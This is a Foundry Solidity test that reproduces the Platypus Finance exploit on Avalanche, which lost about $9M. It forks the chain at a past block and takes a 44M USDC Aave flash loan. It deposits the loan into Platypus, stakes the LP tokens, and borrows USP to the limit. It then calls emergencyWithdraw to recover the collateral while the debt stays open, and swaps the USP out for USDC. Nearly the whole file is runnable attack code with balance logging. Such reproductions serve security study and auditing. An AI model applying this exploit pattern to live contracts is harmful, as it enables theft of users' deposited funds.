// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./interface/cheat.sol";
import "./interface/IAAVEPool.sol";
import "./interface/IERC20.sol";

// Total Lost: 9,000,000 US$
// Chain: Avalanche
// Attacker: 0xeff003d64046a6f521ba31f39405cb720e953958
// Attack Contract: 0x67afdd6489d40a01dae65f709367e1b1d18a5322
// Attack Tx: https://snowtrace.io/tx/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430
// Vulnerable Contract: (Proxy: 0xff6934aac9c94e1c39358d4fdcf70aeca77d0ab0)0xc007f27b757a782c833c568f5851ae1dfe0e6ec7

contract PlatypusExp is Test {
    CheatCodes constant cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IAAVEPool constant AAVEPool = IAAVEPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IERC20 constant USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    // IAAvAUSDC constant aaveUSDC = IAAvAUSDC(0x625E7708f30cA75bfd92586e17077590C60eb4cD);

    IPlatypusAsset constant LP_USDC = IPlatypusAsset(0xAEf735B1E7EcfAf8209ea46610585817Dc0a2E16);
    IPlatypusPool constant PlatypusPool = IPlatypusPool(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
    IMasterPlatypusV4 constant MasterPlatypusV4 = IMasterPlatypusV4(0xfF6934aAC9C94E1C39358D4fDCF70aeca77D0AB0);
    IPlatypusTreasure constant PlatypusTreasure = IPlatypusTreasure(0x061da45081ACE6ce1622b9787b68aa7033621438);
    IERC20 constant USP = IERC20(0xdaCDe03d7Ab4D81fEDdc3a20fAA89aBAc9072CE2);

    function setUp() public {
        cheats.createSelectFork("Avalanche", 26_343_613);
    }

    function testAttack() public {
        AAVEPool.flashLoanSimple(address(this), address(USDC), 44_000_000 * 1e6, "0x00", 0);
        console2.log("Flashloan payback success.");
        console2.log("The balance of this(USDC): ", USDC.balanceOf(address(this)));
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata data)
        external
        returns (bool)
    {
        console2.log("In flashLoan....");
        console2.log("after Flashloan..");
        console2.log("The balance of this(USDC): ", USDC.balanceOf(address(this)));
        console2.log("The balance of this(LP_USDC): ", LP_USDC.balanceOf(address(this)));
        console2.log("The balance of this(USP): ", USP.balanceOf(address(this)));

        USDC.approve(address(PlatypusPool), type(uint256).max);

        PlatypusPool.deposit(address(USDC), USDC.balanceOf(address(this)), address(this), block.timestamp);
        console2.log("after PlatypusPool deposit..");
        console2.log("The balance of this(USDC): ", USDC.balanceOf(address(this)));
        console2.log("The balance of this(LP_USDC): ", LP_USDC.balanceOf(address(this)));
        console2.log("The balance of this(USP): ", USP.balanceOf(address(this)));

        LP_USDC.approve(address(MasterPlatypusV4), type(uint256).max);
        uint256 amount0 = LP_USDC.balanceOf(address(this));
        MasterPlatypusV4.deposit(4, amount0);
        console2.log("after MasterPlatypusV4 deposit..");
        console2.log("The balance of this(USDC): ", USDC.balanceOf(address(this)));
        console2.log("The balance of this(LP_USDC): ", LP_USDC.balanceOf(address(this)));
        console2.log("The balance of this(USP): ", USP.balanceOf(address(this)));

        IPlatypusTreasure.PositionView memory s = IPlatypusTreasure.PositionView({
            collateralAmount: 0,
            collateralUSD: 0,
            borrowLimitUSP: 0,
            liquidateLimitUSP: 0,
            debtAmountUSP: 0,
            debtShare: 0,
            healthFactor: 0,
            liquidable: true
        });
        s = PlatypusTreasure.positionView(address(this), address(LP_USDC));
        PlatypusTreasure.borrow(address(LP_USDC), s.borrowLimitUSP);
        console2.log("after borrow..");
        console2.log("The balance of this(USDC): ", USDC.balanceOf(address(this)));
        console2.log("The balance of this(LP_USDC): ", LP_USDC.balanceOf(address(this)));
        console2.log("The balance of this(USP): ", USP.balanceOf(address(this)));

        MasterPlatypusV4.emergencyWithdraw(4);
        console2.log("after emergencyWithdraw..");
        console2.log("The balance of this(USDC): ", USDC.balanceOf(address(this)));
        console2.log("The balance of this(LP_USDC): ", LP_USDC.balanceOf(address(this)));
        console2.log("The balance of this(USP): ", USP.balanceOf(address(this)));

        USP.approve(address(PlatypusPool), type(uint256).max);
        PlatypusPool.withdraw(address(USDC), LP_USDC.balanceOf(address(this)), 0, address(this), block.timestamp);
        console2.log("after PlatypusPool withdraw..");
        console2.log("The balance of this(USDC): ", USDC.balanceOf(address(this)));
        console2.log("The balance of this(LP_USDC): ", LP_USDC.balanceOf(address(this)));
        console2.log("The balance of this(USP): ", USP.balanceOf(address(this)));

        PlatypusPool.swap(
            address(USP), address(USDC), 2_500_000_000_000_000_000_000_000, 0, address(this), block.timestamp
        );
        console2.log("after swap..");
        console2.log("The balance of this(USDC): ", USDC.balanceOf(address(this)));

        // 归还闪电贷,aave v3 flashloanSimple只需要授权即可，返回后会自动转钱归还闪电贷
        USDC.approve(address(AAVEPool), amount + premium);
        return true;
    }
}

////////////////////////////////////////////////////////

interface IMasterPlatypusV4 {
    function add(address _lpToken, address _rewarder) external;

    function deposit(uint256 _pid, uint256 _amount)
        external
        returns (uint256 reward, uint256[] memory additionalRewards);

    function depositFor(uint256 _pid, uint256 _amount, address _user) external;

    function dilutingRepartition() external view returns (uint16);

    function emergencyPtpWithdraw() external;

    function emergencyWithdraw(uint256 _pid) external;

    function multiClaim(uint256[] memory _pids)
        external
        returns (uint256 reward, uint256[] memory amounts, uint256[][] memory additionalRewards);

    function rewarderBonusTokenInfo(uint256 _pid)
        external
        view
        returns (address[] memory bonusTokenAddresses, string[] memory bonusTokenSymbols);

    function withdraw(uint256 _pid, uint256 _amount)
        external
        returns (uint256 reward, uint256[] memory additionalRewards);
}

interface IPlatypusAsset is IERC20 {
    function addCash(uint256 amount) external;

    function addLiability(uint256 amount) external;

    function aggregateAccount() external view returns (address);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function burn(address to, uint256 amount) external;

    function cash() external view returns (uint256);

    function decimals() external view returns (uint8);

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);

    function initialize(address underlyingToken_, string memory name_, string memory symbol_, address aggregateAccount_)
        external;

    function liability() external view returns (uint256);

    function maxSupply() external view returns (uint256);

    function mint(address to, uint256 amount) external;

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function transferOwnership(address newOwner) external;

    function transferUnderlyingToken(address to, uint256 amount) external;

    function underlyingToken() external view returns (address);

    function underlyingTokenBalance() external view returns (uint256);
}

interface IPlatypusPool {
    function addAsset(address token, address asset) external;

    function assetOf(address token) external view returns (address);

    function deposit(address token, uint256 amount, address to, uint256 deadline)
        external
        returns (uint256 liquidity);

    function initialize() external;

    function owner() external view returns (address);

    function pause() external;

    function paused() external view returns (bool);

    function quoteMaxInitialAssetWithdrawable(address initialToken, address wantedToken)
        external
        view
        returns (uint256 maxInitialAssetAmount);

    function quotePotentialSwap(address fromToken, address toToken, uint256 fromAmount)
        external
        view
        returns (uint256 potentialOutcome, uint256 haircut);

    function quotePotentialWithdraw(address token, uint256 liquidity)
        external
        view
        returns (uint256 amount, uint256 fee, bool enoughCash);

    function quotePotentialWithdrawFromOtherAsset(address initialToken, address wantedToken, uint256 liquidity)
        external
        view
        returns (uint256 amount, uint256 fee);

    function removeAsset(address key) external;

    function renounceOwnership() external;

    function setDev(address dev) external;

    function setHaircutRate(uint256 haircutRate_) external;

    function setMaxPriceDeviation(uint256 maxPriceDeviation_) external;

    function setPriceOracle(address priceOracle) external;

    function setRetentionRatio(uint256 retentionRatio_) external;

    function setSlippageParams(uint256 k_, uint256 n_, uint256 c1_, uint256 xThreshold_) external;

    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external returns (uint256 actualToAmount, uint256 haircut);

    function transferOwnership(address newOwner) external;

    function unpause() external;

    function withdraw(address token, uint256 liquidity, uint256 minimumAmount, address to, uint256 deadline)
        external
        returns (uint256 amount);

    function withdrawFromOtherAsset(
        address initialToken,
        address wantedToken,
        uint256 liquidity,
        uint256 minimumAmount,
        address to,
        uint256 deadline
    ) external returns (uint256 amount);
}

interface IPlatypusTreasure {
    struct PositionView {
        uint256 collateralAmount;
        uint256 collateralUSD;
        uint256 borrowLimitUSP;
        uint256 liquidateLimitUSP;
        uint256 debtAmountUSP;
        uint256 debtShare;
        uint256 healthFactor; // `healthFactor` is 0 if `debtAmountUSP` is 0
        bool liquidable;
    }

    function positionView(address _user, address _token) external view returns (PositionView memory);
    function borrow(address _token, uint256 _borrowAmount) external;
}

interface IAAvAUSDC is IERC20 {
    function handleRepayment(address user, uint256 amount) external;
}
